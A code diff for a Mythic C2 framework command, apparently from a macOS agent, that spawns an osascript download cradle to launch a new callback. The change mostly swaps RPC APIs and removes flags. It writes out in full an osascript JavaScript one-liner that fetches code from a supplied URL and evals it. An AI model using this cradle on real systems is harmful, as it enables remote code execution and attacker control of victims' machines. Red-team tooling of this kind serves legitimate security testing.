@@ -1,6 +1,6 @@
 from mythic_payloadtype_container.MythicCommandBase import *
 import json
-from mythic_payloadtype_container.MythicResponseRPC import *
+from mythic_payloadtype_container.MythicRPC import *
 
 
 class SpawnDownloadCradleArguments(TaskArguments):
@@ -30,19 +30,13 @@ class SpawnDownloadCradleCommand(CommandBase):
     help_cmd = "spawn_download_cradle"
     description = "Spawn a new osascript download cradle as a backgrounded process to launch a new callback"
     version = 1
-    is_exit = False
-    is_file_browse = False
-    is_process_list = False
-    is_download_file = False
-    is_remove_file = False
-    is_upload_file = False
     author = "@its_a_feature_"
     attackmapping = []
     argument_class = SpawnDownloadCradleArguments
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        resp = await MythicResponseRPC(task).register_artifact(
-            artifact_instance="/usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('{}')),$.NSUTF8StringEncoding)));\"".format(task.args.get_arg("url")),
+        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
+            artifact="/usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('{}')),$.NSUTF8StringEncoding)));\"".format(task.args.get_arg("url")),
             artifact_type="Process Create",
         )
         return task
